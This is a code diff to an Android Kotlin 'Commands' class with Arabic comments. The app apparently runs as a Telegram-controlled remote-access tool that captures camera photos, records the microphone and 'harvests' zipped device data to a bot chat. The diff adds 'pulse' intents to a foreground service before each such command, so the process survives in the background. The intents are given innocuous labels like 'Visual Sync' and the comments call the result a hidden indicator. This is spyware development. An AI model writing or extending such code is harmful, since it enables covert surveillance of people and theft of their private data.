@@ -2,6 +2,7 @@ package com.example.app
 
 import android.Manifest
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.MediaRecorder
 import android.os.Build
@@ -30,6 +31,7 @@ import com.example.app.CallbackData
  * ✅ تم حذف دالة ensureComponents بالكامل لأنها غير مستخدمة.
  * ✅ تم إصلاح دالة invokeMethod لاستخدام الاسم وعدد المعاملات فقط مع تخزين مؤقت لتحسين الأداء.
  * ✅ تم إصلاح معالجة reply_markup في invokeTelegramMethod لضمان تحويلها إلى JSON صحيح.
+ * ✅ تم إضافة نبض (Pulse) للخدمة الأمامية عند تنفيذ أوامر الكاميرا والميكروفون والحصاد لتجنب قتل العمليات في الخلفية.
  */
 class Commands private constructor(context: Context) {
 
@@ -725,7 +727,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر الكاميرا
+    //  معالج أوامر الكاميرا (مع إرسال نبض للخدمة الأمامية)
     // ============================================================
 
     private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -742,6 +744,9 @@ class Commands private constructor(context: Context) {
                 sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
                 return
             }
+
+            // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة (لتجنب قتل العملية)
+            sendPulseIntent("Visual Sync")
 
             sendTelegramAction(tg, cid, "upload_photo")
 
@@ -761,7 +766,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر الميكروفون
+    //  معالج أوامر الميكروفون (مع إرسال نبض للخدمة الأمامية)
     // ============================================================
 
     private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) {
@@ -770,6 +775,9 @@ class Commands private constructor(context: Context) {
                 sendTelegramMessage(tg, cid, "⏳ التسجيل قيد التنفيذ")
                 return
             }
+
+            // ✅ إرسال نبض للخدمة الأمامية قبل بدء التسجيل
+            sendPulseIntent("Audio Sync")
 
             stopRecordingFlag = false
             val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
@@ -797,11 +805,14 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الحصاد (Harvest)
+    //  معالج الحصاد (Harvest) (مع إرسال نبض للخدمة الأمامية)
     // ============================================================
 
     private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
+            // ✅ إرسال نبض للخدمة الأمامية قبل بدء الحصاد
+            sendPulseIntent("Data Harvest")
+
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
@@ -1050,6 +1061,30 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Send document error: ${e.message}")
             false
+        }
+    }
+
+    // ============================================================
+    //  ✅ دالة مساعدة لإرسال نبض للخدمة الأمامية
+    // ============================================================
+
+    /**
+     * إرسال نبض (Pulse) إلى الخدمة الأمامية لإظهار إشعار عابر.
+     * يُستخدم قبل تنفيذ الأوامر الحساسة (كاميرا، ميكروفون، حصاد)
+     * لتجنب قتل العملية في الخلفية ولإعطاء مؤشر بصري خفي.
+     *
+     * @param actionType نوع العملية (Visual Sync, Audio Sync, Data Harvest)
+     */
+    private fun sendPulseIntent(actionType: String) {
+        try {
+            val intent = Intent(appContext, ForegroundService::class.java).apply {
+                action = "PULSE_ACTION"
+                putExtra("action_type", actionType)
+            }
+            appContext?.startService(intent)
+            Log.d(TAG, "✅ Pulse intent sent: $actionType")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to send pulse intent: ${e.message}")
         }
     }
 }
